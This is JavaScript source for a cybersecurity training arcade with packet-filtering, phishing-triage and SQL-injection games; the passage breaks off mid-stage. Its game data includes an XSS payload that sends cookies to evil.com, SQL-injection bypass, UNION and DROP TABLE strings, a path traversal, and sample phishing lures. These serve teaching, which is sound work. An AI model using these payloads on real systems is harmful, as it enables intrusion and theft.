/**
 * ==========================================================================
 * PWNBOX CYBER COMMAND // TACTICAL ARCADE & MINI-GAMES ENGINE
 * Integrated Suite of 8 Interactive Cybersecurity Learning Games
 * ==========================================================================
 */

// ── 1. GLOBAL ARCADE STATE & AUDIO SYNTHESIZER ──
const ArcadeState = {
    totalXp: parseInt(localStorage.getItem('pwnbox_arcade_xp') || '0', 10),
    activeGame: 'game-packet-gatekeeper',
    audioMuted: false,
};

function addArcadeXp(points) {
    ArcadeState.totalXp += points;
    localStorage.setItem('pwnbox_arcade_xp', ArcadeState.totalXp);
    const xpDisp = document.getElementById('totalXpDisplay');
    if (xpDisp) {
        xpDisp.textContent = `TOTAL XP: ${ArcadeState.totalXp}`;
    }
}

// Retro Web Audio Synthesizer for Zero-Asset Instant Cyber SFX
const CyberAudio = {
    ctx: null,
    init() {
        if (!this.ctx) {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (AudioContext) {
                this.ctx = new AudioContext();
            }
        }
    },
    playTone(freq, type = 'sine', duration = 0.15, gainVal = 0.1) {
        if (ArcadeState.audioMuted) return;
        try {
            this.init();
            if (!this.ctx) return;
            if (this.ctx.state === 'suspended') {
                this.ctx.resume();
            }
            const osc = this.ctx.createOscillator();
            const gain = this.ctx.createGain();
            osc.type = type;
            osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
            gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + duration);
            osc.connect(gain);
            gain.connect(this.ctx.destination);
            osc.start();
            osc.stop(this.ctx.currentTime + duration);
        } catch (e) {
            // Audio Context silent fail safe
        }
    },
    success() {
        this.playTone(587.33, 'triangle', 0.1, 0.12);
        setTimeout(() => this.playTone(880, 'triangle', 0.2, 0.12), 100);
    },
    fail() {
        this.playTone(220, 'sawtooth', 0.25, 0.15);
        setTimeout(() => this.playTone(146.83, 'sawtooth', 0.35, 0.15), 120);
    },
    blip() {
        this.playTone(660, 'square', 0.08, 0.05);
    },
    alert() {
        this.playTone(440, 'sawtooth', 0.1, 0.15);
        setTimeout(() => this.playTone(330, 'sawtooth', 0.15, 0.15), 100);
    }
};

// ── 2. UNIVERSAL GAME SWITCHER ──
function switchGame(gameId) {
    CyberAudio.blip();
    ArcadeState.activeGame = gameId;

    // Update Tab Buttons
    document.querySelectorAll('.game-tab-btn').forEach(btn => {
        if (btn.getAttribute('data-target') === gameId) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });

    // Update Game Containers
    document.querySelectorAll('.game-instance-container').forEach(container => {
        if (container.id === gameId) {
            container.classList.add('active');
        } else {
            container.classList.remove('active');
        }
    });

    // Trigger Initializer if available
    if (gameId === 'game-packet-gatekeeper' && typeof initPacketGatekeeper === 'function') {
        initPacketGatekeeper();
    } else if (gameId === 'game-phish-detective' && typeof initPhishDetective === 'function') {
        initPhishDetective();
    } else if (gameId === 'game-sqli-locksmith' && typeof initSqliLocksmith === 'function') {
        initSqliLocksmith();
    } else if (gameId === 'game-cidr-block' && typeof initCidrBlock === 'function') {
        initCidrBlock();
    } else if (gameId === 'game-privesc-tower' && typeof initPrivescTower === 'function') {
        initPrivescTower();
    } else if (gameId === 'game-ransom-panic' && typeof initRansomPanic === 'function') {
        initRansomPanic();
    } else if (gameId === 'game-entropy-clash' && typeof initEntropyClash === 'function') {
        initEntropyClash();
    } else if (gameId === 'game-cipher-relic' && typeof initCipherRelic === 'function') {
        initCipherRelic();
    }
}

// ── 3. GAME 1: PACKET GATEKEEPER IMPLEMENTATION ──
const PacketGatekeeper = {
    health: 100,
    score: 0,
    streak: 0,
    level: 1,
    currentPacket: null,
    timerInterval: null,
    timeRemaining: 7.0,
    packetCounter: 1001,
    isProcessing: false,

    // Database of packet scenarios with cyber security justifications
    packetDatabase: [
        // Level 1: Basic Insecure vs Standard Protocols
        {
            level: 1,
            srcIp: '192.168.1.104',
            destPort: '443 (HTTPS)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK'],
            encryption: 'TLS 1.3 ENCRYPTED',
            payload: '[Encrypted Application Data: SHA256 Stream]',
            action: 'allow',
            reason: 'Standard TLS-encrypted HTTPS web session. Safe to forward.'
        },
        {
            level: 1,
            srcIp: '185.120.34.8',
            destPort: '23 (TELNET)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'NONE (PLAINTEXT)',
            payload: 'login: admin password: password123',
            action: 'drop',
            reason: 'Telnet transmits passwords unencrypted over cleartext! Must be blocked in favor of SSH.'
        },
        {
            level: 1,
            srcIp: '10.0.0.12',
            destPort: '53 (DNS)',
            protocol: 'UDP',
            flags: ['UDP'],
            encryption: 'PLAIN DNS',
            payload: 'Query: api.github.com A IN (Size: 42 bytes)',
            action: 'allow',
            reason: 'Standard low-volume DNS query to trusted domain.'
        },
        {
            level: 1,
            srcIp: '194.26.29.112',
            destPort: '445 (SMB)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'UNAUTHENTICATED',
            payload: 'SMBv1 Negotiate Protocol Request (EternalBlue Vector)',
            action: 'drop',
            reason: 'External WAN access to SMB Port 445 is an extreme risk (EternalBlue/WannaCry attack vector)!'
        },

        // Level 2: Scans & SYN Floods
        {
            level: 2,
            srcIp: '203.0.113.88',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'NONE',
            payload: '[SYN Flood Burst: Missing ACK from spoofed subnet]',
            action: 'drop',
            reason: 'High frequency half-open TCP SYN packet with no handshake completion — Classic SYN Flood DoS!'
        },
        {
            level: 2,
            srcIp: '198.51.100.5',
            destPort: '22 (SSH)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'SSH-2.0-OpenSSH_8.9p1',
            payload: '[Encrypted SSH Session Key Exchange]',
            action: 'allow',
            reason: 'Valid encrypted administrative SSH session from authorized bastion range.'
        },
        {
            level: 2,
            srcIp: '45.154.255.8',
            destPort: '3389 (RDP)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'NONE',
            payload: 'RDP Credential Spray Attack: Attempt 142/5000',
            action: 'drop',
            reason: 'Public Internet RDP brute-force attack (BlueKeep target). Port 3389 must never be exposed publicly.'
        },

        // Level 3: Web Application Exploits
        {
            level: 3,
            srcIp: '185.220.101.4',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'HTTP PLAINTEXT',
            payload: 'GET /login?user=admin\'%20OR%201=1-- HTTP/1.1',
            action: 'drop',
            reason: 'Classic SQL Injection (`\' OR 1=1--`) attempting authentication bypass!'
        },
        {
            level: 3,
            srcIp: '172.16.4.19',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'HTTP PLAINTEXT',
            payload: 'POST /feedback?msg=<script>fetch("http://evil.com/"+document.cookie)</script>',
            action: 'drop',
            reason: 'Stored Cross-Site Scripting (XSS) payload attempting cookie theft.'
        },
        {
            level: 3,
            srcIp: '192.168.1.150',
            destPort: '443 (HTTPS)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK'],
            encryption: 'TLS 1.3',
            payload: 'GET /dashboard/metrics HTTP/2 (Valid JWT Bearer Token)',
            action: 'allow',
            reason: 'Authorized HTTPS API call with legitimate authorization header.'
        },
        {
            level: 3,
            srcIp: '194.67.210.12',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'HTTP PLAINTEXT',
            payload: 'GET /view?page=../../../../etc/passwd HTTP/1.1',
            action: 'drop',
            reason: 'Path / Directory Traversal exploit attempting to read Linux sensitive password database.'
        },

        // Level 4 & 5: Advanced & Zero-Day Sandbox / Quarantine
        {
            level: 4,
            srcIp: '198.18.0.44',
            destPort: '53 (DNS)',
            protocol: 'UDP',
            flags: ['UDP'],
            encryption: 'PLAIN DNS',
            payload: 'Query: 616263646566.c2-exfil.xyz TXT (Size: 840 bytes, Base64 Encoded)',
            action: 'quarantine',
            reason: 'Abnormally huge TXT record query with hex payload — high probability of DNS Tunneling & Data Exfiltration! Sent to Sandbox.'
        },
        {
            level: 4,
            srcIp: '10.0.5.210',
            destPort: '443 (HTTPS)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'SELF-SIGNED / UNTRUSTED CA',
            payload: 'TLS ClientHello [Certificate Issued to: "Internal-Test-Cert-Invalid-Root"]',
            action: 'quarantine',
            reason: 'Suspicious untrusted root CA certificate on internal segment. Requires sandbox detonation before letting through.'
        },
        {
            level: 5,
            srcIp: '192.0.2.14',
            destPort: '123 (NTP)',
            protocol: 'UDP',
            flags: ['UDP'],
            encryption: 'NTP MONLIST',
            payload: 'NTP monlist query (Amplification Vector: 1:556 ratio)',
            action: 'drop',
            reason: 'NTP Monlist Reflection DDoS amplification attack vector! Dropped immediately.'
        },
        {
            level: 5,
            srcIp: '192.168.1.20',
            destPort: '22 (SSH)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK'],
            encryption: 'SSH-2.0',
            payload: 'Encrypted payload [Unusual binary signature: 0xDEADBEEF in banner]',
            action: 'quarantine',
            reason: 'Anomalous SSH implementation banner matches known backdoor implant. Quarantined for reverse engineering.'
        }
    ]
};

function initPacketGatekeeper() {
    PacketGatekeeper.health = 100;
    PacketGatekeeper.score = 0;
    PacketGatekeeper.streak = 0;
    PacketGatekeeper.level = 1;
    PacketGatekeeper.isProcessing = false;

    updatePgUI();
    const modal = document.getElementById('pgModal');
    if (modal) modal.style.display = 'none';

    addPgLog('Gatekeeper IDS online. Perimeter filtering initiated.', 'success');
    spawnNextPacket();
}

function updatePgUI() {
    const healthEl = document.getElementById('pgHealthVal');
    const scoreEl = document.getElementById('pgScoreVal');
    const streakEl = document.getElementById('pgStreakVal');
    const levelEl = document.getElementById('pgLevelVal');

    if (healthEl) {
        healthEl.textContent = `${PacketGatekeeper.health}%`;
        healthEl.style.color = PacketGatekeeper.health > 50 ? 'var(--accent-green)' : (PacketGatekeeper.health > 25 ? 'var(--accent-yellow)' : 'var(--accent-red)');
    }
    if (scoreEl) scoreEl.textContent = PacketGatekeeper.score;
    if (streakEl) streakEl.textContent = `${Math.min(PacketGatekeeper.streak, 5)}x`;
    if (levelEl) levelEl.textContent = `${PacketGatekeeper.level} / 5`;
}

function spawnNextPacket() {
    clearInterval(PacketGatekeeper.timerInterval);
    PacketGatekeeper.isProcessing = false;

    // Filter available packets based on current level
    const candidates = PacketGatekeeper.packetDatabase.filter(p => p.level <= PacketGatekeeper.level);
    const chosen = candidates[Math.floor(Math.random() * candidates.length)];
    PacketGatekeeper.currentPacket = chosen;
    PacketGatekeeper.packetCounter++;

    // Reset card animation classes
    const card = document.getElementById('pgPacketCard');
    if (card) {
        card.className = 'pg-packet-card';
    }

    // Populate Fields
    document.getElementById('pgPktId').textContent = `PACKET #${PacketGatekeeper.packetCounter}`;
    document.getElementById('pgSrcIp').textContent = chosen.srcIp;
    document.getElementById('pgDestPort').textContent = chosen.destPort;
    document.getElementById('pgEncryption').textContent = chosen.encryption;
    document.getElementById('pgPayload').textContent = chosen.payload;

    // Flags
    const flagsBox = document.getElementById('pgFlagsContainer');
    if (flagsBox) {
        flagsBox.innerHTML = chosen.flags.map(f => `<span class="flag-chip active-flag">${f}</span>`).join('');
    }

    // Dynamic Directive Hint
    const directiveEl = document.getElementById('pgRuleDirective');
    if (directiveEl) {
        if (PacketGatekeeper.level === 1) {
            directiveEl.textContent = 'DIRECTIVE (LVL 1): Allow secure HTTPS/DNS. DROP plaintext Telnet (23) & SMB (445).';
        } else if (PacketGatekeeper.level === 2) {
            directiveEl.textContent = 'DIRECTIVE (LVL 2): Guard against SYN Floods & public RDP (3389) brute-forcing.';
        } else if (PacketGatekeeper.level === 3) {
            directiveEl.textContent = 'DIRECTIVE (LVL 3): DPI Active. Detect SQLi, XSS, & Path Traversal in HTTP payloads.';
        } else {
            directiveEl.textContent = 'DIRECTIVE (LVL 4+): Advanced Ops. Sandbox DNS Tunneling & suspicious certs to Quarantine.';
        }
    }

    // Start TTL Countdown
    const baseTime = Math.max(3.5, 7.5 - (PacketGatekeeper.level * 0.7));
    PacketGatekeeper.timeRemaining = baseTime;
    const timerEl = document.getElementById('pgPacketTimer');

    PacketGatekeeper.timerInterval = setInterval(() => {
        PacketGatekeeper.timeRemaining -= 0.1;
        if (timerEl) {
            timerEl.textContent = `TTL: ${Math.max(0, PacketGatekeeper.timeRemaining).toFixed(1)}s`;
        }

        if (PacketGatekeeper.timeRemaining <= 0) {
            clearInterval(PacketGatekeeper.timerInterval);
            handlePgTimeout();
        }
    }, 100);
}

function handlePgAction(playerAction) {
    if (PacketGatekeeper.isProcessing || !PacketGatekeeper.currentPacket) return;
    PacketGatekeeper.isProcessing = true;
    clearInterval(PacketGatekeeper.timerInterval);

    const pkt = PacketGatekeeper.currentPacket;
    const card = document.getElementById('pgPacketCard');

    // Visual animation based on action
    if (card) {
        card.classList.add(`anim-${playerAction}`);
    }

    const isCorrect = (playerAction === pkt.action);

    if (isCorrect) {
        CyberAudio.success();
        PacketGatekeeper.score += 100 * Math.max(1, PacketGatekeeper.streak);
        PacketGatekeeper.streak++;
        addArcadeXp(25);

        // Health recovery
        PacketGatekeeper.health = Math.min(100, PacketGatekeeper.health + 5);

        // Level Up Threshold
        if (PacketGatekeeper.score >= 500 && PacketGatekeeper.level === 1) PacketGatekeeper.level = 2;
        if (PacketGatekeeper.score >= 1200 && PacketGatekeeper.level === 2) PacketGatekeeper.level = 3;
        if (PacketGatekeeper.score >= 2200 && PacketGatekeeper.level === 3) PacketGatekeeper.level = 4;
        if (PacketGatekeeper.score >= 3500 && PacketGatekeeper.level === 4) PacketGatekeeper.level = 5;

        addPgLog(`[CORRECT] ${playerAction.toUpperCase()} on ${pkt.destPort} from ${pkt.srcIp}. ${pkt.reason}`, 'success');
    } else {
        CyberAudio.fail();
        PacketGatekeeper.streak = 0;
        PacketGatekeeper.health -= 25;
        addPgLog(`[MISTAKE!] Action was ${playerAction.toUpperCase()} but required ${pkt.action.toUpperCase()}! ${pkt.reason}`, 'breach');
    }

    updatePgUI();

    // Check Loss Condition
    if (PacketGatekeeper.health <= 0) {
        setTimeout(triggerPgGameOver, 400);
    } else {
        setTimeout(spawnNextPacket, 400);
    }
}

function handlePgTimeout() {
    if (PacketGatekeeper.isProcessing) return;
    PacketGatekeeper.isProcessing = true;
    CyberAudio.alert();
    PacketGatekeeper.health -= 20;
    PacketGatekeeper.streak = 0;
    addPgLog(`[TIMEOUT] Inspection window expired for packet to ${PacketGatekeeper.currentPacket.destPort}. Buffer overflow penalty!`, 'warning');
    updatePgUI();

    if (PacketGatekeeper.health <= 0) {
        triggerPgGameOver();
    } else {
        setTimeout(spawnNextPacket, 400);
    }
}

function addPgLog(msg, type = 'info') {
    const feed = document.getElementById('pgLogFeed');
    if (!feed) return;
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    const timestamp = new Date().toTimeString().split(' ')[0];
    entry.innerHTML = `<strong>[${timestamp}]</strong> ${msg}`;
    feed.prepend(entry);

    // Limit log size to 15 entries
    while (feed.children.length > 15) {
        feed.removeChild(feed.lastChild);
    }
}

function triggerPgGameOver() {
    clearInterval(PacketGatekeeper.timerInterval);
    CyberAudio.fail();
    const modal = document.getElementById('pgModal');
    if (modal) {
        document.getElementById('pgModalTitle').textContent = 'GATEWAY INTEGRITY COMPROMISED';
        document.getElementById('pgModalMsg').textContent = `The firewall failed under threat pressure. You filtered ${PacketGatekeeper.score / 100} packets and attained Level ${PacketGatekeeper.level}.`;
        modal.style.display = 'flex';
    }
}

// ── 4. KEYBOARD SHORTCUTS FOR ARCADE ──
document.addEventListener('keydown', (e) => {
    // Single-key shortcuts only if not in an input
    const activeEl = document.activeElement;
    if (activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA')) return;

    if (ArcadeState.activeGame === 'game-packet-gatekeeper') {
        const k = e.key.toLowerCase();
        if (k === 'a' || e.key === 'ArrowLeft') {
            e.preventDefault();
            handlePgAction('allow');
        } else if (k === 'd' || e.key === 'ArrowRight') {
            e.preventDefault();
            handlePgAction('drop');
        } else if (k === 's' || e.key === 'ArrowDown') {
            e.preventDefault();
            handlePgAction('quarantine');
        }
    }
});

// Auto-boot on load
window.addEventListener('DOMContentLoaded', () => {
    addArcadeXp(0);
    initPacketGatekeeper();
});


// ── 5. GAME 2: PHISH DETECTIVE IMPLEMENTATION ──
const PhishDetective = {
    currentIndex: 0,
    investigated: 0,
    score: 0,
    strikes: 0,
    answered: false,

    cases: [
        {
            senderName: 'Elena Vance (CEO)',
            rawFrom: 'elena.vance.ceo@mail-outlook-free.com [SPF: FAIL | DMARC: NONE]',
            subject: 'URGENT: Confidential Client Request (Need you now)',
            body: `
                <p>Hello,</p>
                <p>I am stuck in an offsite executive conference and our presentation is in 30 minutes. I need you to purchase <strong>5x $100 Apple Gift Cards</strong> immediately for the client representatives.</p>
                <p>Scratch the backs and reply directly with the claim codes. <em>Do not call me — my mobile phone has zero signal here.</em></p>
                <p>Keep this between us until the meeting concludes.</p>
                <p>Best regards,<br><strong>Elena Vance</strong><br>Chief Executive Officer</p>
            `,
            hasLink: false,
            hasAttachment: false,
            correctVerdict: 'spear-phish',
            explanation: 'WHALING / CEO FRAUD: Notice the public webmail address (mail-outlook-free.com) masquerading as the CEO, extreme urgency, insistence on secrecy, and unusual gift card purchase demands.'
        },
        {
            senderName: 'PwnBox IT Security Team',
            rawFrom: 'support@pwnb0x-internal.net [SPF: SOFTFAIL | TYPOSQUAT DOMAIN]',
            subject: 'CRITICAL: Your Password Expires in 2 Hours',
            body: `
                <p>Operative,</p>
                <p>Our identity servers detected that your single sign-on domain credentials will expire in <strong>2 hours</strong>.</p>
                <p>To retain your existing password and prevent account suspension, verify your identity immediately:</p>
                <p><span class="pd-interactive-link" data-real-url="http://194.26.29.5/identity/harvest.php">🔗 https://auth.pwnbox.internal/renew-sso-password</span></p>
                <p>Failure to complete verification will result in immediate network revocation.</p>
            `,
            hasLink: true,
            hasAttachment: false,
            correctVerdict: 'phishing',
            explanation: 'CREDENTIAL HARVESTING PHISH: The sender domain is typosquatted (pwnb0x with a zero). Hovering over the link reveals the actual destination points to an unencrypted external rogue IP (194.26.29.5).'
        },
        {
            senderName: 'Corporate Communications',
            rawFrom: 'internal-comms@pwnbox.internal [SPF: PASS | DKIM: VALID]',
            subject: 'Town Hall & Q4 Strategic Roadmap Reminder',
            body: `
                <p>Team,</p>
                <p>A quick reminder that our quarterly all-hands meeting is scheduled for this Thursday at 15:00 UTC on our internal conferencing bridge.</p>
                <p>You can review the preliminary agenda and submit questions in advance on our company portal:</p>
                <p><span class="pd-interactive-link" data-real-url="https://portal.pwnbox.internal/townhall-q4">🔗 https://portal.pwnbox.internal/townhall-q4</span></p>
                <p>See you all there!</p>
            `,
            hasLink: true,
            hasAttachment: false,
            correctVerdict: 'legitimate',
            explanation: 'LEGITIMATE: Verified internal domain, authentic SPF and DKIM cryptographic signatures, and the link destination matches the true internal company intranet.'
        },
        {
            senderName: 'Apex Logistics Billing',
            rawFrom: 'invoicing@apexlogistics-dispatch.co [EXTERNAL SENDER]',
            subject: 'OVERDUE NOTICE: Invoice #INV-9921-FINAL',
            body: `
                <p>Attention Accounts Payable,</p>
                <p>Your scheduled shipment #9921 is on hold due to outstanding storage fees. We have attached the itemized invoice below.</p>
                <p>Please review and execute payment today to avoid inventory auctioning.</p>
                <div class="pd-attachment-box" data-mime-info="Executable Binary (PE32 Windows GUI) | Hash: 0x9a8f4b...">
                    <span>📎</span>
                    <span>INVOICE_OVERDUE_9921.pdf.exe (418 KB)</span>
                </div>
            `,
            hasLink: false,
            hasAttachment: true,
            correctVerdict: 'phishing',
            explanation: 'MALWARE DROPPER: Employs a double file extension (.pdf.exe) hoping Windows default settings hide known extensions. Hovering over the attachment reveals the true MIME type is a PE32 executable binary.'
        },
        {
            senderName: 'Talent & HR Recruitment',
            rawFrom: 'compensation-hr@contractor-talent-review.org [EXTERNAL]',
            subject: 'Confidential: FY26 Executive Bonus & Performance Distribution',
            body: `
                <p>Dear Colleague,</p>
                <p>Attached is the confidential salary revision matrix for your department. Due to privacy protection, the workbook is encrypted with corporate rights management.</p>
                <p><em>You must click "Enable Content / Enable Macros" at the top of MS Word when prompted to allow the macro to decrypt the table.</em></p>
                <div class="pd-attachment-box" data-mime-info="VBA Macro Script Detected: AutoOpen() -> Powershell Download Cradle">
                    <span>📎</span>
                    <span>Executive_Bonus_Matrix.docm (280 KB)</span>
                </div>
            `,
            hasLink: false,
            hasAttachment: true,
            correctVerdict: 'spear-phish',
            explanation: 'WEAPONIZED MACRO / SPEAR PHISHING: Targeted bait specifically tailored to department compensation. Coerces the user into enabling VBA macros which execute a malicious PowerShell download cradle.'
        },
        {
            senderName: 'SecOps Infrastructure Monitoring',
            rawFrom: 'secops@pwnbox.internal [SPF: PASS | DKIM: VALID]',
            subject: 'Scheduled Maintenance: Datacenter Core Switch Firmware Upgrade',
            body: `
                <p>All Operatives,</p>
                <p>Datacenter spine switches in Region US-East will undergo scheduled firmware upgrades tonight between 01:00 - 02:00 UTC. Redundant paths will remain active, but minor packet jitter may occur.</p>
                <p>Track live maintenance status here: <span class="pd-interactive-link" data-real-url="https://status.pwnbox.internal">🔗 https://status.pwnbox.internal</span></p>
                <p>No action is needed on your workstations.</p>
            `,
            hasLink: true,
            hasAttachment: false,
            correctVerdict: 'legitimate',
            explanation: 'LEGITIMATE: Typical informative SecOps maintenance advisory. Clean internal domain, verified SPF/DKIM, no coercive urgency, and standard status page link.'
        }
    ]
};

function initPhishDetective() {
    PhishDetective.currentIndex = 0;
    PhishDetective.investigated = 0;
    PhishDetective.score = 0;
    PhishDetective.strikes = 0;
    PhishDetective.answered = false;

    renderPdSidebar();
    loadPdCase(0);
    updatePdHUD();
}

function renderPdSidebar() {
    const list = document.getElementById('pdEmailList');
    if (!list) return;
    list.innerHTML = '';

    PhishDetective.cases.forEach((c, idx) => {
        const item = document.createElement('div');
        item.className = `pd-email-item ${idx === PhishDetective.currentIndex ? 'active' : ''}`;
        item.onclick = () => {
            if (!PhishDetective.answered && PhishDetective.currentIndex !== idx) {
                loadPdCase(idx);
            }
        };
        item.innerHTML = `
            <div class="pd-email-sender">${c.senderName}</div>
            <div class="pd-email-sub">${c.subject}</div>
        `;
        list.appendChild(item);
    });

    const badge = document.getElementById('pdInboxBadge');
    if (badge) {
        badge.textContent = `${PhishDetective.cases.length - PhishDetective.investigated} PENDING`;
    }
}

function loadPdCase(idx) {
    PhishDetective.currentIndex = idx;
    PhishDetective.answered = false;
    const c = PhishDetective.cases[idx];

    // Meta bar
    const fromEl = document.getElementById('pdFromField');
    const subEl = document.getElementById('pdSubjectField');
    const bodyEl = document.getElementById('pdMailBody');
    const banner = document.getElementById('pdVerdictBanner');
    const nextBtn = document.getElementById('pdNextBtn');

    if (fromEl) {
        fromEl.textContent = c.senderName;
        fromEl.setAttribute('data-tooltip', `INSPECTION RESULT:\n${c.rawFrom}`);
    }
    if (subEl) subEl.textContent = c.subject;
    if (bodyEl) bodyEl.innerHTML = c.body;

    if (banner) {
        banner.className = 'pd-verdict-banner';
        banner.style.display = 'none';
        banner.innerHTML = '';
    }
    if (nextBtn) nextBtn.style.display = 'none';

    renderPdSidebar();
}

function handlePdVerdict(userChoice) {
    if (PhishDetective.answered) return;
    PhishDetective.answered = true;
    PhishDetective.investigated++;

    const c = PhishDetective.cases[PhishDetective.currentIndex];
    const isCorrect = (userChoice === c.correctVerdict);
    const banner = document.getElementById('pdVerdictBanner');
    const nextBtn = document.getElementById('pdNextBtn');

    if (isCorrect) {
        CyberAudio.success();
        PhishDetective.score += 150;
        addArcadeXp(35);
        if (banner) {
            banner.className = 'pd-verdict-banner correct';
            banner.innerHTML = `
                <strong>✅ EXCELLENT TRIAGE (+150 PTS):</strong> You accurately identified this as <strong>${userChoice.toUpperCase()}</strong>.<br>
                <span style="font-size: 0.74rem; opacity: 0.9;">${c.explanation}</span>
            `;
        }
    } else {
        CyberAudio.fail();
        PhishDetective.strikes++;
        if (banner) {
            banner.className = 'pd-verdict-banner wrong';
            banner.innerHTML = `
                <strong>⚠️ TRIAGE MISTAKE!</strong> You marked this as <strong>${userChoice.toUpperCase()}</strong>, but it is actually <strong>${c.correctVerdict.toUpperCase()}</strong>.<br>
                <span style="font-size: 0.74rem; opacity: 0.9;">${c.explanation}</span>
            `;
        }
    }

    if (nextBtn) nextBtn.style.display = 'inline-block';
    updatePdHUD();
}

function nextPdEmail() {
    CyberAudio.blip();
    if (PhishDetective.currentIndex + 1 < PhishDetective.cases.length) {
        loadPdCase(PhishDetective.currentIndex + 1);
    } else {
        // Complete Queue
        const banner = document.getElementById('pdVerdictBanner');
        if (banner) {
            banner.className = 'pd-verdict-banner correct';
            banner.style.display = 'block';
            banner.innerHTML = `
                <strong>🏆 INBOX TRIAGE COMPLETED!</strong><br>
                Final Score: <strong>${PhishDetective.score} PTS</strong> with ${PhishDetective.strikes} strike(s). Excellent analysis of modern social engineering tactics!
            `;
        }
        const nextBtn = document.getElementById('pdNextBtn');
        if (nextBtn) {
            nextBtn.textContent = '🔄 REPLAY INBOX';
            nextBtn.onclick = () => initPhishDetective();
        }
    }
}

function updatePdHUD() {
    const countEl = document.getElementById('pdCountVal');
    const accEl = document.getElementById('pdAccuracyVal');
    const scoreEl = document.getElementById('pdScoreVal');
    const strikesEl = document.getElementById('pdStrikesVal');

    if (countEl) countEl.textContent = `${PhishDetective.investigated} / ${PhishDetective.cases.length}`;
    if (scoreEl) scoreEl.textContent = PhishDetective.score;
    if (strikesEl) strikesEl.textContent = `${PhishDetective.strikes} / 3`;

    if (accEl) {
        const accuracy = PhishDetective.investigated === 0 ? 100 : Math.round(((PhishDetective.investigated - PhishDetective.strikes) / PhishDetective.investigated) * 100);
        accEl.textContent = `${Math.max(0, accuracy)}%`;
        accEl.style.color = accuracy >= 80 ? 'var(--accent-green)' : (accuracy >= 50 ? 'var(--accent-yellow)' : 'var(--accent-red)');
    }
}


// ── 6. GAME 3: SQLi LOCKSMITH IMPLEMENTATION ──
const SqliLocksmith = {
    stage: 1,
    score: 0,
    activeSlotIndex: 0,
    slotValues: [],

    stages: [
        {
            stage: 1,
            title: 'CHAMBER #01: AUTHENTICATION BYPASS',
            sub: 'Neutralize the password verification check to log in as administrator.',
            queryHtml: `
                <span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> users 
                <span class="sql-keyword">WHERE</span> username = '<span class="sqli-slot" id="sqliSlot0" onclick="selectSqliSlot(0)">[ CLICK TO SELECT ]</span>' 
                <span class="sql-keyword">AND</span> password = '<span class="sqli-slot" id="sqliSlot1" onclick="selectSqliSlot(1)">[ CLICK TO SELECT ]</span>' 
                <span class="sql-keyword">LIMIT</span> 1;
            `,
            numSlots: 2,
            tokens: ["admin' --", "' OR 1=1 --", "admin", "password123", "' OR '1'='1", "' AND 1=2 --"],
            validate: (slots) => {
                const s0 = slots[0] || '';
                const s1 = slots[1] || '';
                if (s0 === "admin' --" || s0 === "' OR 1=1 --") {
                    return { ok: true, explanation: "SUCCESS! The `' --` characters terminated the query early and converted the password requirement into a comment. The database authenticated the record immediately!" };
                }
                if (s0 === "admin" && s1 === "' OR '1'='1") {
                    return { ok: true, explanation: "SUCCESS! The password condition evaluated to `'' OR '1'='1'`, which is universally truthy!" };
                }
                return { ok: false, explanation: "Query failed: The credentials did not evaluate to a true WHERE clause. Try using `' --` to comment out the password check." };
            }
        },
        {
            stage: 2,
            title: 'CHAMBER #02: NUMERIC INJECTION (NO QUOTES)',
            sub: 'Integer parameters lack quotes. Exploit the unquoted where clause to dump unauthorized records.',
            queryHtml: `
                <span class="sql-keyword">SELECT</span> balance, owner <span class="sql-keyword">FROM</span> accounts 
                <span class="sql-keyword">WHERE</span> account_id = <span class="sqli-slot" id="sqliSlot0" onclick="selectSqliSlot(0)">[ CLICK TO SELECT ]</span>;
            `,
            numSlots: 1,
            tokens: ["1 OR 1=1", "1042", "0 OR id > 0", "' OR 1=1 --", "DROP TABLE accounts"],
            validate: (slots) => {
                const s0 = slots[0] || '';
                if (s0 === "1 OR 1=1" || s0 === "0 OR id > 0") {
                    return { ok: true, explanation: "SUCCESS! Because the numeric column is unquoted, no single quote was needed. `OR 1=1` returned all bank account rows!" };
                }
                return { ok: false, explanation: "Failed! Adding quotes here causes a SQL syntax error because the backend query expected a bare integer." };
            }
        },
        {
            stage: 3,
            title: 'CHAMBER #03: UNION DATA EXFILTRATION',
            sub: 'Append your own secondary query to extract confidential password hashes from another table.',
            queryHtml: `
                <span class="sql-keyword">SELECT</span> title, body <span class="sql-keyword">FROM</span> articles 
                <span class="sql-keyword">WHERE</span> id = -1 
                <span class="sql-keyword">UNION SELECT</span> <span class="sqli-slot" id="sqliSlot0" onclick="selectSqliSlot(0)">[ CLICK TO SELECT ]</span>, <span class="sqli-slot" id="sqliSlot1" onclick="selectSqliSlot(1)">[ CLICK TO SELECT ]</span> 
                <span class="sql-keyword">FROM</span> vault_secrets;
            `,
            numSlots: 2,
            tokens: ["admin_user", "password_hash", "1", "'public'", "secret_token", "table_name"],
            validate: (slots) => {
                const s0 = slots[0] || '';
                const s1 = slots[1] || '';
                if ((s0 === "admin_user" || s0 === "secret_token") && (s1 === "password_hash" || s1 === "1")) {
                    return { ok: true, explanation: "SUCCESS! The column counts matched (2 columns), and the UNION operator injected sensitive credential columns directly into the result set!" };
                }
                return { ok: false, explanation: "Select columns that correspond to sensitive user credentials and match the 2-column result shape." };
            }
        },
        {
